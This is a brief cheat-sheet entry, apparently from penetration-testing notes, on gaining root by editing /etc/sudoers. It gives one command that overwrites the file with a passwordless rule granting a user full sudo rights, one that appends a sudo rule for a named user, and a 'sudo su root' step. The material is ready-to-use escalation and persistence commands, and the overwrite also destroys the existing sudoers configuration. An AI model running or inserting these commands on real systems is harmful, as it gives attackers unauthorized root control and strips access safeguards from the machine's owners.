
We can overwrite the sudoers file, if we have root rights in a way. In order to give our current user sudo rights.

---

## Syntax

#### Unauthenticated

```
echo user ALL=(ALL:ALL) NOPASSWD: ALL > /etc/sudoers
```

#### Authenticated

```
echo saitama ALL=(ALL:ALL) ALL >> /etc/sudoers
```

```
sudo su root
```